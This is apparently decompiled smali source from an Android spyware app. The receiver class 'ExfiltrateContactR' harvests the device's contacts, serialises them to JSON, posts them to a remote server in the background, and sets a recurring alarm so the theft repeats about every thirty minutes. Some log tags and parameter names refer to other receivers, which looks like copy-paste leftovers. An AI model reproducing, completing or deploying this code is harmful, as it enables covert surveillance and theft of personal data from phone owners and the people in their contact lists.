.class public Landroid/spyware/receivers/ExfiltrateContactR;
.super Landroid/content/BroadcastReceiver;
.source "ExfiltrateContactR.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 40
    invoke-direct {v0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private setAlarm(Landroid/content/Context;)V
    .registers 10
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/16 v7, 0xc

    const/4 v6, 0x0

    .line 66
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    .line 67
    .local v1, "calendar":Ljava/util/Calendar;
    const/16 v4, 0x1e

    invoke-virtual {v1, v7, v4}, Ljava/util/Calendar;->add(II)V

    .line 69
    new-instance v2, Landroid/content/Intent;

    const-class v4, Landroid/spyware/receivers/ExfiltrateContactR;

    invoke-direct {v2, v9, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 70
    .local v2, "intent":Landroid/content/Intent;
    const/high16 v4, 0x40000000    # 2.0f

    invoke-static {v9, v6, v2, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 72
    .local v3, "pendingIntent":Landroid/app/PendingIntent;
    const-string v4, "alarm"

    invoke-virtual {v9, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 73
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    invoke-virtual {v1}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 76
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-class v6, Landroid/spyware/receivers/ExfiltrateZombieR;

    invoke-virtual {v6}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "->setAlarm:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xa

    invoke-virtual {v1, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 77
    invoke-virtual {v1, v7}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xd

    invoke-virtual {v1, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 76
    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 12
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 44
    const-string v6, "::trace"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-class v8, Landroid/spyware/receivers/ExfiltrateSMSR;

    invoke-virtual {v8}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "->onReceive:receiver started..."

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 47
    new-instance v3, Landroid/spyware/utils/Harvester;

    invoke-direct {v3, v10}, Landroid/spyware/utils/Harvester;-><init>(Landroid/content/Context;)V

    .line 49
    .local v3, "harvester":Landroid/spyware/utils/Harvester;
    invoke-virtual {v3}, Landroid/spyware/utils/Harvester;->getContacts()Ljava/util/List;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    .line 51
    .local v2, "contacts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/model/Contact;>;"
    if-eqz v2, :cond_63

    invoke-virtual {v2}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v6

    if-nez v6, :cond_63

    .line 52
    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    .line 54
    .local v0, "JSONArrayContacts":Lorg/json/JSONArray;
    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :goto_3a
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_4e

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/spyware/model/Contact;

    .local v1, "contact":Landroid/spyware/model/Contact;
    invoke-virtual {v1}, Landroid/spyware/model/Contact;->toJSON()Lorg/json/JSONObject;

    move-result-object v7

    invoke-virtual {v0, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_3a

    .line 56
    .end local v1    # "contact":Landroid/spyware/model/Contact;
    :cond_4e
    new-instance v4, Landroid/spyware/utils/Parameter;

    const-string v6, "ExfiltrateSMS"

    invoke-direct {v4, v6, v0}, Landroid/spyware/utils/Parameter;-><init>(Ljava/lang/String;Lorg/json/JSONArray;)V

    .line 57
    .local v4, "params":Landroid/spyware/utils/Parameter;
    new-instance v5, Landroid/spyware/utils/PostDataAT;

    invoke-direct {v5}, Landroid/spyware/utils/PostDataAT;-><init>()V

    .line 59
    .local v5, "postDataAT":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/utils/Parameter;Ljava/lang/Void;Ljava/lang/Integer;>;"
    const/4 v6, 0x1

    new-array v6, v6, [Landroid/spyware/utils/Parameter;

    const/4 v7, 0x0

    aput-object v4, v6, v7

    invoke-virtual {v5, v6}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 62
    .end local v0    # "JSONArrayContacts":Lorg/json/JSONArray;
    .end local v4    # "params":Landroid/spyware/utils/Parameter;
    .end local v5    # "postDataAT":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/utils/Parameter;Ljava/lang/Void;Ljava/lang/Integer;>;"
    :cond_63
    invoke-direct {v9, v10}, Landroid/spyware/receivers/ExfiltrateContactR;->setAlarm(Landroid/content/Context;)V

    .line 63
    return-void
.end method
